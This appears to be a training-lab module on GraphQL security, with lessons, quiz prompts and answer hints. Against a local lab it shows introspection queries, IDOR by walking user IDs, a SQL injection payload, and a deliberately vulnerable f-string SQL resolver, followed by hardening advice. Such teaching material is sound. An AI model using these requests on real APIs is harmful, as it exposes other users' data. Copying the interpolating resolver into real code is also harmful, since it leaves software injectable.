title: GraphQL Security: introspection and IDOR
description: The endpoint that exposes everything: introspection as the attack map, IDOR in sequential-ID queries and filter injection.

1.title: Introspection: the attacker's map
1.body:
## An endpoint that explains itself

GraphQL exposes `__schema`: any client can request the full map
of types, fields and arguments. It is a development feature that, in
production, is a gift: the attacker doesn't guess endpoints — they are handed over.

```bash
curl -s http://127.0.0.1:18109/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query": "{ __schema { types { name fields hint } } }"}' | jq .
```

In the lab you will see a type marked `hidden: true`. In a real GraphQL API the
"internal" types (debug, admin, deprecated) live in the schema just the same:
introspection can't tell what the team forgot to remove.

**The right stance**: introspection OFF in production (Apollo:
`validationRules: [NoSchemaIntrospectionCustomRule]`), or behind admin
auth. "Hiding" the schema without disabling resolution protects nothing —
as you are about to see.

## The hidden type that wasn't hidden

Request the field the hint handed you:

```bash
curl -s http://127.0.0.1:18109/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query": "{ secretFlag { value } }"}'
```

The resolver exists and responds. A field nobody was supposed to know about is still
a field anyone can call: security through obscurity
in GraphQL dies the day someone runs introspection.

## IDOR with nice typing

```bash
curl -s http://127.0.0.1:18109/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query": "{ user(id:1) { email note } }"}'
```

`user(id: N)` looks up by ID without comparing against the session — classic BOLA.
Walk the IDs (1, 2, 3...) and every other user's record falls. In GraphQL this bug is
more frequent than in REST because each resolver is written separately and
whoever doesn't validate the argument "forgets" the authorization.

graphql-security-t01-q01.prompt: Query the __schema and find the type marked as hidden (its hint field tells you how to reach the flag). What is that type called?
graphql-security-t01-q01.hint: curl -s http://127.0.0.1:18109/graphql -H 'Content-Type: application/json' -d '{"query":"{ __schema { types { name hint } } }"}'

graphql-security-t01-q02.prompt: You are alice (id=2). Retrieve user id=1's (admin) note via the user query. Submit the flag.
graphql-security-t01-q02.hint: {"query":"{ user(id:1) { email note } }"} — the resolver checks neither owner nor role

graphql-security-t01-q03.prompt: Use the hidden type the introspection revealed to get the final flag.
graphql-security-t01-q03.hint: query { secretFlag { value } } — resolvers exist for EVERY type in the schema

2.title: Filter injection: the resolver that interpolates
2.body:
## The same old SQLi, with modern syntax

The lab's resolver does something like:

```python
sql = f"SELECT * FROM documents WHERE title LIKE '%{q}%' AND class != 'restricted'"
```

The GraphQL syntax is new; the vulnerability is straight out of the 90s. With the
injection, the `AND class != 'restricted'` no longer has any effect:

```bash
curl -s http://127.0.0.1:18109/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query": "{ search(q: \"'"'"' OR '"'"'1'"'"'='"'"'1\") { title class } }"}'
```

(with websocat-like quoting this gets messy: the lab panel has the
exact command ready to copy). The result: all three documents, including the
restricted postmortem with the flag.

## How a real GraphQL API is hardened

| Layer | Measure |
|---|---|
| Schema | Introspection off, depth/complexity limits (anti-query-bomb) |
| Queries | **Persisted queries**: only operations pre-registered by the frontend are executed |
| Resolvers | Authorization PER OBJECT in every resolver (never "the endpoint already validated it") |
| Inputs | Typed parameters + escaping/ORM, just like classic SQL |
| Rate limit | Query cost per user (a single nested query can cost as much as 1000 requests) |

The cross-cutting lesson of this room: GraphQL changes the TRANSPORT of
queries, not the rules of the game. Everything you learned about IDOR, injection
and authorization applies just the same — except that now the attacker picks the exact
shape of the query, and you have to validate it on the server.

graphql-security-t02-q01.prompt: The search(q:) field interpolates the filter. Collapse the WHERE with a classic OR and submit the restricted document's flag.
graphql-security-t02-q01.hint: {"query":"{ search(q:\"' OR '1'='1\") { title class } }"} — returns ALL documents, including the restricted one

graphql-security-t02-q02.prompt: Which hardened-GraphQL defense layer validates the query against an operation allowlist before executing (production)?
graphql-security-t02-q02.hint: Persisted queries / operation allowlisting: the server only executes pre-registered queries
